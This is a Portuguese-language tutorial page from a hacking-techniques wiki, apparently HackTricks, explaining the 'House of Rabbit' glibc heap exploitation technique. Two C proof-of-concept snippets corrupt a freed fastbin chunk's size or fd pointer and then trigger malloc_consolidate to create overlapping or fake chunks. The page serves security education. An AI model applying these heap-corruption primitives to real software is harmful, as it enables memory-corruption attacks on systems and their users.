# House of Rabbit

{{#include ../../banners/hacktricks-training.md}}

### Requisitos

1. **Capacidade de modificar o ponteiro fd do fast bin ou o tamanho**: Isso significa que você pode alterar o ponteiro para frente de um chunk no fastbin ou seu tamanho.
2. **Capacidade de acionar `malloc_consolidate`**: Isso pode ser feito alocando um chunk grande ou mesclando o chunk superior, o que força o heap a consolidar chunks.

### Objetivos

1. **Criar chunks sobrepostos**: Para ter um chunk sobrepondo-se a outro, permitindo mais manipulações do heap.
2. **Forjar chunks falsos**: Para enganar o alocador fazendo-o tratar um chunk falso como um chunk legítimo durante operações de heap.

## Etapas do ataque

### POC 1: Modificar o tamanho de um chunk do fast bin

**Objetivo**: Criar um chunk sobreposto manipulando o tamanho de um chunk do fastbin.

- **Etapa 1: Alocar Chunks**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Alocamos dois pedaços de 0x40 bytes cada. Esses pedaços serão colocados na lista de fast bin uma vez liberados.

- **Passo 2: Liberar Pedaços**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Liberamos ambos os chunks, adicionando-os à lista fastbin.

- **Passo 3: Modificar o Tamanho do Chunk**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Mudamos os metadados de tamanho de `chunk1` para 0xa1. Este é um passo crucial para enganar o alocador durante a consolidação.

- **Passo 4: Acionar `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Alocar um grande bloco aciona a função `malloc_consolidate`, mesclando pequenos blocos no fast bin. O tamanho manipulado de `chunk1` faz com que ele se sobreponha a `chunk2`.

Após a consolidação, `chunk1` se sobrepõe a `chunk2`, permitindo uma exploração adicional.

### POC 2: Modificar o ponteiro `fd`

**Objetivo**: Criar um bloco falso manipulando o ponteiro `fd` do fast bin.

- **Passo 1: Alocar Blocos**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Explicação**: Alocamos dois pedaços, um menor e um maior, para preparar o heap para o pedaço falso.

- **Passo 2: Criar pedaço falso**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Escrevemos metadados de chunk falso em `chunk2` para simular chunks menores.

- **Passo 3: Liberar `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Explicação**: Liberamos `chunk1`, adicionando-o à lista fastbin.

- **Passo 4: Modificar `fd` de `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Explicação**: Mudamos o ponteiro para frente (`fd`) do `chunk1` para apontar para nosso chunk falso dentro do `chunk2`.

- **Passo 5: Acionar `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Alocar um grande bloco novamente aciona `malloc_consolidate`, que processa o bloco falso.

O bloco falso se torna parte da lista fastbin, tornando-se um bloco legítimo para exploração adicional.

### Resumo

A técnica **House of Rabbit** envolve modificar o tamanho de um bloco fast bin para criar blocos sobrepostos ou manipular o ponteiro `fd` para criar blocos falsos. Isso permite que atacantes forjem blocos legítimos na heap, possibilitando várias formas de exploração. Compreender e praticar esses passos aprimorará suas habilidades de exploração de heap.

{{#include ../../banners/hacktricks-training.md}}
